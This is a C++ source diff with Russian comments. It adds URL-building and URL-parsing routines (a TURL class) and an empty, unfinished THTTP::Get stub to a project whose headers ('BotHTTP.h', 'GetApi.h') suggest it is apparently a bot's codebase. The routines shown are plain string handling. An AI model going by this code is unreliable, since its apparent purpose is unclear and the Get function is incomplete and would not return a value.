@@ -9,6 +9,7 @@
 #include "GetApi.h"
 #include "Utils.h"
 #include "BotHTTP.h"
+#include "HTTPConsts.h"
 
 #include "Modules.h"
 
@@ -1750,3 +1751,149 @@ PCHAR HTTPUtils::DeleteHeaderValue(PCHAR Buf, int &Size, PCHAR Header)
 
 }
 
+
+// ***************************************************************************
+// 								TURL
+// ***************************************************************************
+
+
+TURL::TURL(const char * aURL)
+{
+	if (aURL)
+    	DoParse(aURL);
+}
+
+
+string TURL::URL()
+{
+	// Функция собирет полный адрес
+
+	if (Host.IsEmpty())
+		return NULLSTR;
+
+    // Инициализируем недостающие данные
+	if (Protocol.IsEmpty())
+		Protocol = ProtocolHTTP;
+
+	if (Path.IsEmpty())
+		Path = HTTPSlash;
+	else
+	{
+    	// Проверяем начальный и конечный слэш
+		if (Path[0] != *HTTPSlash)
+			Path.Insert(HTTPSlash, 0);
+    }
+
+	// Расчитываем общую длину
+	DWORD Len = Protocol.Length() + 3 +
+				Host.Length() +
+				Path.Length() +
+				Document.Length() +
+				Params.Length() + 2;
+
+
+    // Собираем данные
+	string R(Len);
+
+	R += Protocol;
+	R += HTTPProtocolDelimeter;
+	R += Host;
+	R += Path;
+	R += Document;
+
+	if (!Params.IsEmpty())
+	{
+		R += HTTPParamsDelimeter;
+		R += Params;
+    }
+
+	return R;
+}
+
+void TURL::Clear()
+{
+	Protocol.Clear();
+	Host.Clear();
+	Path.Clear();
+	Document.Clear();
+	Params.Clear();
+	Port = HTTPDefaultPort;
+}
+
+bool TURL::Parse(const char *URL)
+{
+	Clear();
+    return DoParse(URL);
+}
+
+
+bool TURL::DoParse(const char *URL)
+{
+	// Функция разбирает адрес на состовляющие
+
+	if (URL == NULL)
+		return false;
+
+	int Pos = STR::Pos(URL, HTTPProtocolDelimeter);
+	if (Pos >= 0)
+	{
+		// Разделитель найден
+		Protocol.Copy(URL, 0, Pos);
+		URL += Pos + STRA::Length(HTTPProtocolDelimeter);
+    }
+
+	// Определяем позицию начала пути
+	Pos = STR::Pos(URL, HTTPSlash);
+
+	if (Pos < 0)
+	{
+		// Адрес не содержит путь
+		if (STR::Scan(URL, '.') == NULL) return false;
+		Host = URL;
+		return true;
+	}
+
+	// Сохраняем хост и переводуим указатель на начало пути
+	Host.Copy(URL, 0, Pos);
+	URL += Pos;
+
+	// Следующим этапом получаем пост данные
+	string DocAndPath;
+
+	Pos = STR::Pos(URL, HTTPParamsDelimeter);
+	if (Pos >= 0)
+	{
+		// Сохраняем параметры
+		Params = URL + Pos + 1;
+	}
+	else
+        Pos = AnsiStr::Length(URL);
+
+
+	// Разделяем путь и докумет
+	const char* DocPtr = URL + Pos;
+
+	// Переходим к началу имени документа
+	while (DocPtr > URL && *DocPtr != *HTTPSlash) DocPtr--;
+	DocPtr++;
+
+	// Копируем имя документа
+    DWORD DocLen = Pos - (DocPtr - URL);
+	Document.Copy(DocPtr, 0, DocLen);
+
+	// копируем
+	Path.Copy(URL, 0, DocPtr - URL);
+
+	return true;
+}
+
+
+// ***************************************************************************
+// 								TURL
+// ***************************************************************************
+
+string THTTP::Get(const string &URL)
+{
+	// Функция загружает страницу с указанного адреса
+
+}
